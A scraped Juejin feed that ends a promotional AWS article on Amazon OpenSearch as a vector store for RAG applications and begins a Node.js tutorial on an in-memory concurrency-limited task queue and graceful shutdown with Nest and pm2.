<p>目前，OpenSearch Serverless 已在多个实际客户场景中得到落地应用。例如 riskCanvas——一款基于 SaaS 的金融犯罪合规解决方案产品，充分利用大数据、自动化与机器学习等先进技术，帮助客户提升合规效率与业务智能化水平。riskCanvas 通过与 OpenSearch Serverless 向量引擎集成，结合 Amazon 生成式 AI 能力，将客户操作数据转化为可搜索、可理解的语义向量，为金融领域的风控和合规提供了强大的支持[8]。</p>
<h2 data-id="heading-5">Amazon OpenSearch 与 Amazon AI 服务的强大组合</h2>
<p>Amazon OpenSearch 与 Amazon Bedrock 的深度集成为企业级 RAG（Retrieval-Augmented Generation）应用构建提供了端到端的完整解决方案。Amazon Bedrock 让开发者可以轻松接入多种主流基础模型，而 Amazon OpenSearch 则提供了高性能、可扩展的向量检索能力。这种强强联合，使企业能够更高效地构建并部署高质量的生成式 AI 应用，加速智能化转型。</p>
<p>例如在前文第 3.1 节所介绍的嵌入集成流程中，Amazon OpenSearch 与 Amazon Bedrock 之间的集成极为简便，仅需几行代码即可实现向量生成与检索的完整闭环。开发者可以使用 Amazon Bedrock 提供的嵌入模型（如 Amazon Titan Embeddings）将文档和用户查询编码为向量，然后将这些向量存入 Amazon OpenSearch，进一步实现高效语义检索。</p>
<p>此外，对于部分简单的业务场景，也可以借助 Amazon OpenSearch 本身的机器学习能力与 Amazon AI 服务中的模型能力，快速搭建 RAG 应用。例如，利用 OpenSearch 内置的 Retrieval-Augmented Generation Processor（RAG 处理器），结合部署在 Amazon SageMaker 上的 DeepSeek 模型和嵌入模型，即可快速构建语义增强的问答系统[9]。更进一步，Amazon Bedrock Knowledge Bases 还支持通过控制台“一键集成”到 Amazon OpenSearch，无需编写复杂代码即可完成 RAG 流程配置，提供极致简洁的托管化使用体验[10]。</p>
<p>这一整套生态系统的协同工作，不仅显著降低了构建 RAG 应用的门槛，还在性能、灵活性与可维护性方面为企业用户带来可观的优势。无论是面向终端客户的智能问答系统，还是企业内部的知识库检索应用，OpenSearch 与 Bedrock 的协同都为生成式 AI 的落地提供了坚实技术支撑。</p>
<h2 data-id="heading-6">OpenSeach 与开源生态</h2>
<p>除了广泛应用于亚马逊内部系统以及亚马逊云服务客户构建的企业级应用中，OpenSearch 作为向量数据库的能力也被开源社区和第三方开发者认可，已在多个主流项目中得到实际应用。例如 Mem0、Dify 和 LangChain 等项目，均在生产环境中采用 OpenSearch 来满足对高性能语义检索和横向扩展能力的需求。</p>
<p>Mem0 是一个专注于构建记忆系统的框架，支持多种向量数据库作为后端存储，其中就包括 OpenSearch。通过抽象统一的接口和模块化工厂模式，Mem0 允许开发者灵活地选择最适合当前场景的向量存储引擎，并在配置中自定义集合名称、节点地址、端口号、向量维度等参数，从而实现快速集成与部署。</p>
<p>LangChain 则将 OpenSearch 深度集成进其语言模型应用开发框架中，利用 OpenSearch 支持近似最近邻（k-NN）搜索和语义检索的能力，配合 LangChain 提供的文档加载、文本切分与嵌入生成模块，开发者能够快速构建出高效的检索增强生成（RAG）系统，实现自然语言理解与响应的智能化。</p>
<p>Dify 作为一个开源的 LLMOps 平台，也支持将 OpenSearch 作为向量存储后端，适配多种部署环境，包括本地开发、私有化部署和云原生架构，使其在性能、灵活性和可维护性方面均具备良好的扩展潜力。这些项目的实践表明，OpenSearch 在构建大规模、低延迟、可水平扩展的语义检索系统中表现出色，已经成为生产级向量数据库解决方案的重要选项之一。</p>
<h2 data-id="heading-7">总结</h2>
<p>可以看到，Amazon OpenSearch 凭借其全面的搜索能力、灵活的向量检索机制、原生混合搜索支持以及强大的元数据过滤功能，为构建企业级 RAG（检索增强生成）系统提供了坚实的技术基础。从底层的 KNN 插件与量化优化，到与 Amazon Bedrock、SageMaker 等服务的深度集成，再到 Serverless 架构下的简化部署，Amazon OpenSearch 在性能、扩展性与易用性方面展现出卓越优势。无论是面向大规模向量数据检索、高并发响应，还是满足复杂多样的企业级检索需求，Amazon OpenSearch 都能提供稳定、高效且具成本效益的解决方案，是打造高质量 RAG 应用的首选平台。</p>
<p><strong>参考文档</strong></p>
<p>[1]<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.opensearch.org%2Fdocs%2Flatest%2Fvector-search%2Fvector-search-techniques%2Findex%2F" target="_blank" title="https://docs.opensearch.org/docs/latest/vector-search/vector-search-techniques/index/" ref="nofollow noopener noreferrer">OpenSearch KNN Search Methods and engines</a></p>
<p>[2] <a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fblogs%2Fbig-data%2Fchoose-the-k-nn-algorithm-for-your-billion-scale-use-case-with-opensearch%2F" target="_blank" title="https://aws.amazon.com/blogs/big-data/choose-the-k-nn-algorithm-for-your-billion-scale-use-case-with-opensearch/" ref="nofollow noopener noreferrer">Choose the k-NN algorithm for your billion-scale use case with OpenSearch</a></p>
<p>[3] <a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fcn%2Fblogs%2Fchina%2Fpractice-of-knowledge-question-answering-application-based-on-llm-knowledge-base-construction-part-4%2F" target="_blank" title="https://aws.amazon.com/cn/blogs/china/practice-of-knowledge-question-answering-application-based-on-llm-knowledge-base-construction-part-4/" ref="nofollow noopener noreferrer">基于大语言模型知识问答应用落地实践 – 知识召回调优（下）</a></p>
<p>[4] <a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fcn%2Fblogs%2Fchina%2Fopensearch-implements-automatic-embedding-based-on-ml-commons-plugin%2F" target="_blank" title="https://aws.amazon.com/cn/blogs/china/opensearch-implements-automatic-embedding-based-on-ml-commons-plugin/" ref="nofollow noopener noreferrer">OpenSearch 基于 ML Commons 插件实现自动 embedding</a></p>
<p>[5] <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.opensearch.org%2Fdocs%2F2.19%2Fvector-search%2Ffilter-search-knn%2Findex%2F" target="_blank" title="https://docs.opensearch.org/docs/2.19/vector-search/filter-search-knn/index/" ref="nofollow noopener noreferrer">OpenSearch KNN Filtering data</a></p>
<p>[6] <a href="https://link.juejin.cn?target=https%3A%2F%2Fopensearch.org%2Fblog%2Fa-deep-dive-into-faster-semantic-sparse-retrieval-in-os-2-12%2F%3Futm_source%3Dchatgpt.com" target="_blank" title="https://opensearch.org/blog/a-deep-dive-into-faster-semantic-sparse-retrieval-in-os-2-12/?utm_source=chatgpt.com" ref="nofollow noopener noreferrer">A deep dive into faster semantic sparse retrieval in OpenSearch 2.12</a></p>
<p>[7] <a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fcn%2Fblogs%2Fbig-data%2Fintegrate-sparse-and-dense-vectors-to-enhance-knowledge-retrieval-in-rag-using-amazon-opensearch-service%2F" target="_blank" title="https://aws.amazon.com/cn/blogs/big-data/integrate-sparse-and-dense-vectors-to-enhance-knowledge-retrieval-in-rag-using-amazon-opensearch-service/" ref="nofollow noopener noreferrer">Integrate sparse and dense vectors to enhance knowledge retrieval in RAG using Amazon OpenSearch Service</a></p>
<p>[8] <a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fopensearch-service%2Fserverless-vector-database%2F" target="_blank" title="https://aws.amazon.com/opensearch-service/serverless-vector-database/" ref="nofollow noopener noreferrer">Amazon OpenSearch Service as a Vector Database</a></p>
<p>[9] <a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fcn%2Fblogs%2Fchina%2Fbuilding-a-knowledge-base-qna-application-based-on-amazon-opensearch-service-and-deepseek%2F" target="_blank" title="https://aws.amazon.com/cn/blogs/china/building-a-knowledge-base-qna-application-based-on-amazon-opensearch-service-and-deepseek/" ref="nofollow noopener noreferrer">基于 Amazon OpenSearch Service 与 DeepSeek 构建知识库问答应用</a></p>
<p>[10]<a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fblogs%2Faws%2Fknowledge-bases-now-delivers-fully-managed-rag-experience-in-amazon-bedrock%2F" target="_blank" title="https://aws.amazon.com/blogs/aws/knowledge-bases-now-delivers-fully-managed-rag-experience-in-amazon-bedrock/" ref="nofollow noopener noreferrer"> Knowledge Bases now delivers fully managed RAG experience in Amazon Bedrock</a></p>
<p><strong>本篇作者</strong></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/363de0df0eec4ce6ba281e157bfb6e6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764557656&amp;x-signature=bVT0xeOljejcA86nTcEZfa33GWw%3D" alt="" loading="lazy"/></p>
<blockquote>
<p>本期最新实验《<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_InfoQtail_0415%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_InfoQtail_0415" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_InfoQtail_0415&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_InfoQtail_0415" ref="nofollow noopener noreferrer">多模一站通 —— Amazon Bedrock 上的基础模型初体验</a>》</p>
<p>✨ 精心设计，旨在引导您深入探索Amazon Bedrock的模型选择与调用、模型自动化评估以及安全围栏(Guardrail)等重要功能。无需管理基础设施，利用亚马逊技术与生态，快速集成与部署生成式AI模型能力。</p>
<p>⏩️[<a href="https://link.juejin.cn?target=https%3A%2F%2Fdev.amazoncloud.cn%2Fexperience%2Fcloudlab%3Fid%3D6695e4c5e1432f239fae485f%26visitfrom%3D3P_InfoQtail_0415%26sc_medium%3Downed%26sc_campaign%3Dcloudlab%26sc_channel%3D3P_InfoQtail_0415" target="_blank" title="https://dev.amazoncloud.cn/experience/cloudlab?id=6695e4c5e1432f239fae485f&amp;visitfrom=3P_InfoQtail_0415&amp;sc_medium=owned&amp;sc_campaign=cloudlab&amp;sc_channel=3P_InfoQtail_0415" ref="nofollow noopener noreferrer">点击进入实验</a>] 即刻开启 AI 开发之旅构建无限, 探索启程！</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[基于 NodeJs 的分布式任务队列与容器优雅停机]]></title>    <link>https://juejin.cn/post/7575735719076331526</link>    <guid>https://juejin.cn/post/7575735719076331526</guid>    <pubDate>2025-11-24T02:56:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575735719076331526" data-draft-id="7575644469711683603" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="基于 NodeJs 的分布式任务队列与容器优雅停机"/> <meta itemprop="keywords" content="后端,Node.js,JavaScript"/> <meta itemprop="datePublished" content="2025-11-24T02:56:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="WindRunnerMax"/> <meta itemprop="url" content="https://juejin.cn/user/1829999989247214"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            基于 NodeJs 的分布式任务队列与容器优雅停机
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1829999989247214/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    WindRunnerMax
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T02:56:52.000Z" title="Mon Nov 24 2025 02:56:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>当在后端执行复杂的任务时，通常不能够在短时间内即时响应，例如文档导入、导出任务等。再加上当前的<code>LLMs</code>发展，我们可以实现文档的写作、质检、翻译等复杂任务，这些任务通常都比较耗时，这样就需要任务队列来管理这些异步任务的执行顺序和资源分配，而优雅停机则用以保证任务的完整处理。</p>
<details>
<summary><strong>AI Infra 系列相关文章</strong></summary>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWindRunnerMax%2FEveryDay%2Fblob%2Fmaster%2FBrowser%2F%25E5%259F%25BA%25E4%25BA%258Efetch%25E7%259A%2584SSE%25E6%2596%25B9%25E6%25A1%2588.md" target="_blank" title="https://github.com/WindRunnerMax/EveryDay/blob/master/Browser/%E5%9F%BA%E4%BA%8Efetch%E7%9A%84SSE%E6%96%B9%E6%A1%88.md" ref="nofollow noopener noreferrer">基于 fetch 的 SSE 方案</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWindRunnerMax%2FEveryDay%2Fblob%2Fmaster%2FPlugin%2F%25E5%259F%25BA%25E4%25BA%258E%25E5%2590%2591%25E9%2587%258F%25E6%25A3%2580%25E7%25B4%25A2%25E5%25AE%259E%25E7%258E%25B0%25E5%259F%25BA%25E7%25A1%2580RAG%25E6%259C%258D%25E5%258A%25A1.md" target="_blank" title="https://github.com/WindRunnerMax/EveryDay/blob/master/Plugin/%E5%9F%BA%E4%BA%8E%E5%90%91%E9%87%8F%E6%A3%80%E7%B4%A2%E5%AE%9E%E7%8E%B0%E5%9F%BA%E7%A1%80RAG%E6%9C%8D%E5%8A%A1.md" ref="nofollow noopener noreferrer">基于向量检索实现基础 RAG 服务</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWindRunnerMax%2FEveryDay%2Fblob%2Fmaster%2FPlugin%2F%25E6%25B5%2581%25E5%25BC%258FMarkdown%25E5%25A2%259E%25E9%2587%258F%25E5%25AF%258C%25E6%2596%2587%25E6%259C%25AC%25E8%25A7%25A3%25E6%259E%2590%25E7%25AE%2597%25E6%25B3%2595.md" target="_blank" title="https://github.com/WindRunnerMax/EveryDay/blob/master/Plugin/%E6%B5%81%E5%BC%8FMarkdown%E5%A2%9E%E9%87%8F%E5%AF%8C%E6%96%87%E6%9C%AC%E8%A7%A3%E6%9E%90%E7%AE%97%E6%B3%95.md" ref="nofollow noopener noreferrer">流式 Markdown 增量富文本解析算法</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWindRunnerMax%2FEveryDay%2Fblob%2Fmaster%2FPlugin%2F%25E4%25BB%25BF%25E7%2585%25A7%25E8%25B1%2586%25E5%258C%2585%25E5%25AE%259E%25E7%258E%25B0Prompt%25E5%258F%2598%25E9%2587%258F%25E6%25A8%25A1%25E6%259D%25BF%25E8%25BE%2593%25E5%2585%25A5%25E6%25A1%2586.md" target="_blank" title="https://github.com/WindRunnerMax/EveryDay/blob/master/Plugin/%E4%BB%BF%E7%85%A7%E8%B1%86%E5%8C%85%E5%AE%9E%E7%8E%B0Prompt%E5%8F%98%E9%87%8F%E6%A8%A1%E6%9D%BF%E8%BE%93%E5%85%A5%E6%A1%86.md" ref="nofollow noopener noreferrer">仿照豆包实现 Prompt 变量模板输入框</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWindRunnerMax%2FEveryDay%2Fblob%2Fmaster%2FPlugin%2F%25E5%259F%25BA%25E4%25BA%258ENodeJs%25E5%25AE%259E%25E7%258E%25B0%25E4%25BB%25BB%25E5%258A%25A1%25E9%2598%259F%25E5%2588%2597%25E4%25B8%258E%25E4%25BC%2598%25E9%259B%2585%25E5%2581%259C%25E6%259C%25BA.md" target="_blank" title="https://github.com/WindRunnerMax/EveryDay/blob/master/Plugin/%E5%9F%BA%E4%BA%8ENodeJs%E5%AE%9E%E7%8E%B0%E4%BB%BB%E5%8A%A1%E9%98%9F%E5%88%97%E4%B8%8E%E4%BC%98%E9%9B%85%E5%81%9C%E6%9C%BA.md" ref="nofollow noopener noreferrer">基于 NodeJs 的分布式任务队列与容器优雅停机</a></li>
</ul>
</details>
<h2 data-id="heading-0">概述</h2>
<p>任务队列用于管理和调度异步任务，在实现时我们可能会使用一些现成的库，例如<code>Bull/BullMQ</code>、<code>Agenda</code>等。而如果需要实现更复杂的任务/消息调度，例如不同系统、应用之间的可靠消息传递等服务，我们还需要使用<code>Kafka</code>、<code>RabbitMQ</code>等消息队列系统。整体来说，异步任务可以实现如下功能:</p>
<ul>
<li>异步任务，将耗时的操作放到后台去处理，让主程序能够快速返回响应。</li>
<li>流量削峰，将大量请求转化为任务，平稳地存入队列，然后系统按照能承受的处理能力，从队列中取出任务进行消费。</li>
<li>错误重试，当任务执行失败时，队列可以尝试进行重试，如果重试多次后仍然失败，则可以将任务标记为失败。</li>
</ul>
<p>优雅停机则是指在应用程序关闭时，能够正确地处理正在进行的任务，确保数据的一致性和完整性。在这里的优雅停机主要分为针对请求的处理和针对任务队列的处理，请求的部分通常会由网关加上框架本身处理，而任务队列的重置或者结束，则需要靠我们主动处理。整体来说，优雅停机通常需要做如下处理:</p>
<ul>
<li>停止接收新的请求，服务需要避免新的请求进入，这部分通常需要网关等前置节点来处理。</li>
<li>处理当前请求，服务需要继续处理当前已经在处理中的请求，确保这些请求能够正常完成。</li>
<li>释放已分配资源，在请求处理完成后，需要释放所有申请的资源，例如关闭数据库连接等。</li>
<li>关闭服务，当所有请求都处理完毕且资源都已释放后，需要正常关闭服务，或者强制停机。</li>
</ul>
<p>在本文中我们在<code>Nest</code>框架的基础上，实现简化版的分布式任务调度队列。并且基于<code>pm2</code>管理<code>NodeJs</code>进程，实现了优雅停机的能力，而且探讨了<code>Linux</code>系统下进程与信号的传递表现。文中涉及的实现都在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FWindRunnerMax%2Fwebpack-simple-environment" target="_blank" title="https://github.com/WindRunnerMax/webpack-simple-environment" ref="nofollow noopener noreferrer">github.com/WindRunnerM…</a> 中。</p>
<h2 data-id="heading-1">任务队列</h2>
<p>任务队列的实现比较简单，在我们的场景中主要目标就是流量削峰，特别是在调度<code>LLMs</code>时，我们需要将请求排队处理，当前的云服务商都会有并发请求的限制。当前云服务商主要是会限制<code>RPM</code>和<code>TPM</code>，即每分钟请求数和每分钟<code>Token</code>数量，这样就需要我们在应用层进行请求的排队处理。</p>
<p>在这里我们就不借助已有的框架，而是直接实现任务队列，主要目标是能够控制并发任务，并且叙述单进程以及单机集群模式、分布式任务的锁控制方案。而除了任务队列之外，还有很多细节需要处理，例如从数据库读取的控制并发、任务超时控制等，这些都可以在实际应用中进行扩展。</p>
<p>消息队列系统通常会有推送模式以及拉取模式两种消息消费的方式，而实际上在拉取模式下，消费者也需要实现类似的任务队列来控制并发请求，例如<code>Kafka</code>系统。当然如果是推送模式，就可以直接在消息队列中进行并发控制，例如<code>RabbitMQ</code>系统。</p>
<h3 data-id="heading-2">单实例任务</h3>
<p>我们先来实现单实例单进程的任务队列，首先需要实现一个任务队列类，通过实例化这个类我们可以在多个服务<code>Service</code>分别调度队列实例。在这里需要注意的是，如若不想在全局分别创建实例，在<code>Next</code>中就在<code>Provider</code>的类中独立维护实例，但是需要注意其<code>Scope</code>必须为全局单例而非请求级实例。</p>
<pre><code class="hljs language-js" lang="js">@<span class="hljs-title class_">Injectable</span>({ <span class="hljs-attr">scope</span>: <span class="hljs-title class_">Scope</span>.<span class="hljs-property">DEFAULT</span> })
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TasksService</span> {}
</code></pre>
<p>接下来假设实际任务是在数据库中存储的，毕竟任务需要持久化存储以防止数据丢失。然后需要实现<code>TaskQueue</code>类以控制并发任务，由于我们现在是单实例单进程的模式，就不需要分布式锁的要求，因此可以直接使用内存中的变量来控制并发任务，这里先定义类基本的结构:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">export</span> declare <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskQueue</span> {
  <span class="hljs-comment">/** 实例/锁标识 */</span>
  private readonly key;
  <span class="hljs-comment">/** 并发运行数 */</span>
  private readonly maxTasks;
  <span class="hljs-comment">/** 本机正在运行任务数量 */</span>
  private runningTasks;
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-comment">/** 唯一标识 */</span> key: string, <span class="hljs-comment">/** 最大并行任务数 */</span> maxTasks: number</span>);
  <span class="hljs-comment">/** 尝试批量调度任务 */</span>
  <span class="hljs-title function_">tryRun</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-keyword">void</span>&gt;;
  <span class="hljs-comment">/**  正式调度任务 */</span>
  <span class="hljs-title function_">run</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-keyword">void</span>&gt;;
  <span class="hljs-comment">/** 调度运行任务 - 需要实例化后重写该方法 <span class="hljs-doctag">@returns</span> 返回任务标识 id */</span>
  <span class="hljs-title function_">onRunning</span>(): <span class="hljs-title class_">Promise</span>&lt;string | <span class="hljs-literal">undefined</span>&gt;;
  <span class="hljs-comment">/** 分配 Quota */</span>
  <span class="hljs-title function_">assign</span>(): <span class="hljs-title class_">Promise</span>&lt;boolean&gt;;
  <span class="hljs-comment">/** 释放 Quota */</span>
  <span class="hljs-title function_">release</span>(): <span class="hljs-title class_">Promise</span>&lt;boolean&gt;;
}
</code></pre>
<p>接下来关注于<code>assign</code>和<code>release</code>分配和释放<code>Quota</code>方法，在这里我们直接在内存放置<code>Record&lt;string, number&gt;</code>对象来管理并发任务的资源数量。由于最后需要实现分布式锁，因此这里的逻辑实际上是与<code>Redis</code>锁的<code>LUA</code>脚本逻辑类似。</p>
<p>分配<code>Quota</code>时，我们需要检查当前运行的任务数量是否小于最大并发数，如果小于则分配成功并增加运行任务数量，否则分配失败。释放<code>Quota</code>时，我们需要减少运行任务数量，确保不会小于零，这里主要是避免切换<code>key</code>时释放的<code>Quota</code>将值写为负数，这样会导致并发量变高。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">assign</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;boolean&gt; {
  <span class="hljs-keyword">const</span> lockKey = <span class="hljs-string">"_lock_"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span>;
  <span class="hljs-keyword">let</span> current = <span class="hljs-variable constant_">MEMORY_MAP</span>[lockKey];
  <span class="hljs-keyword">if</span> (current === <span class="hljs-keyword">void</span> <span class="hljs-number">0</span>)  current = <span class="hljs-variable constant_">MEMORY_MAP</span>[lockKey] = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">if</span> (current &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">maxTasks</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  <span class="hljs-keyword">const</span> serial = ++<span class="hljs-variable constant_">MEMORY_MAP</span>[lockKey];
  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">release</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;boolean&gt; {
  <span class="hljs-keyword">const</span> lockKey = <span class="hljs-string">"_lock_"</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">key</span>;
  <span class="hljs-keyword">const</span> current = <span class="hljs-variable constant_">MEMORY_MAP</span>[lockKey];
  <span class="hljs-keyword">if</span> (current === <span class="hljs-keyword">void</span> <span class="hljs-number">0</span> || current &lt;= <span class="hljs-number">0</span>) {
    <span class="hljs-variable constant_">MEMORY_MAP</span>[lockKey] = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
  --<span class="hljs-variable constant_">MEMORY_MAP</span>[lockKey];
  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
}
</code></pre>
